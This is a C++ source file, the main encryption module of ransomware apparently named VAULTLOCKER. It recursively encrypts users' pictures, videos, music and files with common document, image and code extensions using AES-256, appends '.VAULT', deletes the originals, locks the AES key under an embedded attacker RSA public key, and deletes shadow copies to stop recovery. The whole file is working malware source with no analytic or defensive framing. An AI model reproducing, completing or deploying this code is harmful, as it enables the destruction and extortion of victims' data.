
// VAULTLOCKER. 2024
// ENCRYPTOR.CPP - MAIN ENCRYPTION MODULE

#include "Encryptor.h"
#include "ShadowCopyManager.h"
#include <fstream>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <openssl/rand.h>
#include <openssl/pem.h>
#include <openssl/bio.h>
#include <Shlobj.h>
#include <filesystem>
#include <vector>
#include <iostream>

namespace fs = std::filesystem;

// RSA PUB KEY IN .PEM FORMAT
const char* rsa_public_key_str = R"(
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApkbojeuFYUQUUUZPG6yj
4qpkoIeT15mXjxj34lZemUHr4l/vutL5oWLsYY2hzbc/tqoxm/NvzGjMZL94Vji0
PPC+9IbPr5fHQqglhMMtL9j6718HMys8maTv4SSgjcr05j9LHve6w7OAfjhhMbCn
UaPCVf/fDehIamCNy59dCv4d/G6xmNQ7a6wropGH/jp3E1VMNnqtqRu1C+Pze72I
6xeZiG2UrjM7uj8V500NkjByjsLbqVp8gTx+4UxGNhBj9X8QsHXSOw8m7yLgc5D0
vOTEndNABUOyEPK+uxCwEJbkXUHphPuZIwVqExpmqKuJa7/5baEJcIGE6e4zNjua
CwIDAQAB
-----END PUBLIC KEY-----
)";

// HELPER FUNC TO ENCRYPT AES KEY WITH RSA PUB KEY
std::vector<unsigned char> encryptAESKey(const std::vector<unsigned char>& aes_key) {
    std::vector<unsigned char> encrypted_key;

    // LOAD RSA PUBLIC KEY
    BIO* bio = BIO_new_mem_buf((void*)rsa_public_key_str, -1);
    if (bio == nullptr) {
        return encrypted_key; 
    }

    EVP_PKEY* rsa_key = PEM_read_bio_PUBKEY(bio, nullptr, nullptr, nullptr);
    if (rsa_key == nullptr) {
        BIO_free(bio);
        return encrypted_key; 
    }
    BIO_free(bio);

   
    size_t encrypted_len = EVP_PKEY_size(rsa_key);
    encrypted_key.resize(encrypted_len);


    EVP_PKEY_CTX* ctx = EVP_PKEY_CTX_new(rsa_key, nullptr);
    if (ctx == nullptr) {
        EVP_PKEY_free(rsa_key);
        return encrypted_key; 
    }

    // ENCRYPT AES KEY WITH RSA & ADD OAEP PADDING
    if (EVP_PKEY_encrypt_init(ctx) <= 0 ||
        EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_OAEP_PADDING) <= 0 ||
        EVP_PKEY_encrypt(ctx, encrypted_key.data(), &encrypted_len, aes_key.data(), aes_key.size()) <= 0) {
        EVP_PKEY_CTX_free(ctx);
        EVP_PKEY_free(rsa_key);
        return encrypted_key; 
    }

    encrypted_key.resize(encrypted_len); // RESIZE TO ACTUAL ENCRYPTED LENGTH

    EVP_PKEY_CTX_free(ctx);
    EVP_PKEY_free(rsa_key);

    return encrypted_key;
}

Encryptor::Encryptor() {
    // INITILIZE OpenSLL LIBS
    OpenSSL_add_all_algorithms();
    ERR_load_crypto_strings();

    //GENERATE KEY AND IV
    if (RAND_bytes(key, EVP_MAX_KEY_LENGTH) != 1) {
    }
    if (RAND_bytes(iv, EVP_MAX_IV_LENGTH) != 1) {
    }
}

Encryptor::~Encryptor() {
    EVP_cleanup();
    ERR_free_strings();
}

int Encryptor::RunEncryption() {
    // LIST OF USER DIRS TO SEARCH FOR FILES
    std::vector<std::string> directories = GetUserDirectories();

    // CHECK IF ENCRYPTION HAS BEEN PERFORMED BY LOOKING FOR .VAULT FILES IN SPECIFIED DIRS 
    if (encryptionAlreadyPerformed(directories)) {
        return 0;
    }

    // LLIST OF EXTENTIONS TO ENCRYPT
    std::vector<std::string> customExtensions = {
        ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".jpg", ".jpeg",
        ".png", ".gif", ".bmp", ".txt", ".csv", ".html", ".htm", ".xml", ".zip",
        ".rar", ".mp3", ".mp4", ".psd", ".ai", ".indd", ".cdr", ".ps", ".odt", ".lnk",
        ".py", ".key", ".cpp"     // ADD EXTENSIONS AS REQUIRED
    };

    // ENCRYPT FILES IN EACH DIR
    for (const auto& directory : directories) {
        encryptFilesInDirectory(directory, customExtensions);
    }

    // SAVE KEY TO FILE AFTER ENCRYPTION
    saveAESKeyToFile();

    //INITILIZE SHADOWCOPYMANAGER
    ShadowCopyManager shadowCopyManager;

    if (shadowCopyManager.Initialize()) {
        shadowCopyManager.DeleteShadowCopiesOfFilesToEncrypt({
            L".VAULT"
            // ADD AS NEEDED
            });
        shadowCopyManager.Cleanup();
    }
    else {
        // HANDLE INITIALIZATION FAILURE
    }


    return 0;
}

bool Encryptor::encryptionAlreadyPerformed(const std::vector<std::string>& directories) {
    for (const auto& directory : directories) {
        if (!fs::exists(directory) || !fs::is_directory(directory)) {
            continue;
        }

        for (const auto& entry : fs::recursive_directory_iterator(directory)) {
            if (fs::is_regular_file(entry) && isAlreadyEncrypted(entry.path().string())) {
                return true;
            }
        }
    }
    return false;
}

void Encryptor::saveAESKeyToFile() {
    // CONVERT AES KEY TO VECTOR FOR ENCRYPTION
    std::vector<unsigned char> aes_key_vec(key, key + EVP_MAX_KEY_LENGTH);

    // ENCRYPT AES KEY WITH RSA PUB KEY
    std::vector<unsigned char> encrypted_aes_key = encryptAESKey(aes_key_vec);

    // SAVE ENCRYPTED AES KEY TO FILE
    std::ofstream keyFile("encrypted_key.bin", std::ios::binary);
    if (keyFile.is_open()) {
        keyFile.write(reinterpret_cast<const char*>(encrypted_aes_key.data()), encrypted_aes_key.size());
        keyFile.close();
    }
    //FREE MEM CONTAINING UNENCRYPTED AES KEY
    OPENSSL_cleanse(key, EVP_MAX_KEY_LENGTH);
}

std::vector<std::string> Encryptor::GetUserDirectories() {
    std::vector<std::string> userDirs;

    // ADD USER DIRS AND DRIVES
    // userDirs.push_back(GetKnownFolderPath(FOLDERID_Desktop));
    userDirs.push_back(GetKnownFolderPath(FOLDERID_Pictures));
    userDirs.push_back(GetKnownFolderPath(FOLDERID_Videos));
    userDirs.push_back(GetKnownFolderPath(FOLDERID_Music));

    return userDirs;
}

void Encryptor::encryptFilesInDirectory(const std::string& directory, const std::vector<std::string>& extensions) {
    if (!fs::exists(directory) || !fs::is_directory(directory)) {
        return;
    }

    // TRAVERSE DIRS AND DRIVES RECURSIVELY
    for (const auto& entry : fs::recursive_directory_iterator(directory)) {
        if (fs::is_regular_file(entry)) {
            std::string inputFile = entry.path().string();
            // CHECK IF FILE IS NOT ALREADY ENCRYPTED AND IF EXTENTION MATCHES
            if (!isAlreadyEncrypted(inputFile) && isExtensionMatch(inputFile, extensions)) {
                // OUTPUT FILENAME WITH ".VAULT" EXTENTION
                std::string outputFile = inputFile + ".VAULT";
                // ENCRYPT THE FILE                 
                encryptFile(inputFile, outputFile);
                // REMOVE ORIGINAL FILE AFTER ENCRYPTION
                fs::remove(inputFile);
            }
        }
    }
}

bool Encryptor::isExtensionMatch(const std::string& filePath, const std::vector<std::string>& extensions) {
    // FIND POSITION OF LAST DOT IN FILE PATH
    size_t pos = filePath.find_last_of(".");
    if (pos != std::string::npos) {
        // EXTRACT FILE EXTENTION
        std::string fileExt = filePath.substr(pos);
        // CHECK IF EXTENTION MATCHES EXTENTIONS IN LIST
        for (const auto& ext : extensions) {
            if (fileExt == ext) {
                return true;
            }
        }
    }
    return false;
}

bool Encryptor::isAlreadyEncrypted(const std::string& filePath) {
    // CHECK FILENAME FOR ".VAULT"
    return filePath.find(".VAULT") != std::string::npos;
}

void Encryptor::encryptFile(const std::string& inputFile, const std::string& outputFile) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        return;
    }

    // GENERATE RANDOM IV FOR EACH FILE
    unsigned char file_iv[EVP_MAX_IV_LENGTH];
    if (RAND_bytes(file_iv, EVP_MAX_IV_LENGTH) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return;
    }

    // INITIALIZE ENCRYPTION WITH AES 256 CBC USING FILE-SPECIFIC IV
    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, file_iv) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return;
    }

    // OPEN INPUT FILE FOR BINARY READING
    std::ifstream inFile(inputFile, std::ios::binary);
    if (!inFile) {
        EVP_CIPHER_CTX_free(ctx);
        return;
    }

    // OPEN OUTPUT FILE FOR BINARY WRITING
    std::ofstream outFile(outputFile, std::ios::binary);
    if (!outFile) {
        inFile.close();
        EVP_CIPHER_CTX_free(ctx);
        return;
    }

    // WRITE IV TO OUTPUT FILE BEFORE ENCRYPTED DATA
    outFile.write(reinterpret_cast<char*>(file_iv), EVP_MAX_IV_LENGTH);

    const size_t bufferSize = 4096;
    unsigned char inBuf[bufferSize], outBuf[bufferSize + EVP_MAX_BLOCK_LENGTH];
    int outLen;

    // READ INPUT FILE IN CHUNKS AND ENCRYPT
    while (!inFile.eof()) {
        inFile.read(reinterpret_cast<char*>(inBuf), bufferSize);
        auto bytesRead = inFile.gcount();
        if (bytesRead <= 0)
            break;

        // ENCRYPT CHUNK
        if (EVP_EncryptUpdate(ctx, outBuf, &outLen, inBuf, static_cast<int>(bytesRead)) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            inFile.close();
            outFile.close();
            return;
        }
        // WRITE ENCRYPTED DATA TO OUTPUT FILE
        outFile.write(reinterpret_cast<char*>(outBuf), outLen);
    }

    // FINALIZE ENCRYPTION
    if (EVP_EncryptFinal_ex(ctx, outBuf, &outLen) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        inFile.close();
        outFile.close();
        return;
    }
    // WRITE FINAL BLOCK OF ENCRYPTED DATA TO OUTPUT FILE
    outFile.write(reinterpret_cast<char*>(outBuf), outLen);

    EVP_CIPHER_CTX_free(ctx);
    inFile.close();
    outFile.close();
}

std::string Encryptor::GetKnownFolderPath(REFKNOWNFOLDERID folderId) {
    PWSTR path = NULL;
    HRESULT result = SHGetKnownFolderPath(folderId, 0, NULL, &path);
    std::string folderPath;

    if (result == S_OK) {
        char buffer[MAX_PATH] = { 0 }; // INITILIZE BUFFER TO ZERO
        size_t numConverted = 0;
        wcstombs_s(&numConverted, buffer, MAX_PATH - 1, path, _TRUNCATE);
        buffer[MAX_PATH - 1] = '\0'; // ZERO-TERMINATE BUFFER
        folderPath = buffer;
    }

    CoTaskMemFree(path);
    return folderPath;
}

